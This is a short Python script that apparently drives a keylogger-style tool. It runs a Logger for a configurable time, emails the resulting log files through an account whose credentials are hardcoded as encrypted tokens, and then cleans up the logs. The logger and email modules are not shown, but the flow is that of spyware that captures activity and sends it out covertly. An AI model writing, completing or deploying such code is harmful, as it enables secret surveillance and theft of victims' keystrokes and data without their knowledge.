import sys
from email_handler import Email
from logger import Logger


def main(time_limit=10, time_interval=3, file_path=sys.path[0] + '/'):
    SETTINGS = (time_limit,
                time_interval,
                file_path)
    EMAIL_INFORMATION = (
            "gAAAAABgqPRCSVmNGRf60VYyIUk_CMCuGTPpqxKiziqAOx2FcoHExzDp2ObdTGRiAXoXg8YDu7JeqfZI_pEGpwcaDDMks1mhlqoagNM1esQ0nU"
            "-HRfQawLg=",
            "gAAAAABgqPRC1-pspwymaSPSPSd5tp6LTuyY63aGqncLt7bUWj4mOTveGOyVIFvhuhVDmfDU6_b9f1H_T8g4Lo5FBCxoFL_heQ==")

    try:
        logger = Logger(*SETTINGS)
        logger.launch()
        email = Email(*EMAIL_INFORMATION)
        email.attach_files(logger.file_path)
        email.login()
        email.send(email.message)
        email.end()
        logger.clean_up()
        del logger, email

    except KeyboardInterrupt:
        print('Program exiting ...')
        sys.exit()  # fail safe


main(*(int(arg) for arg in sys.argv[1:4]))
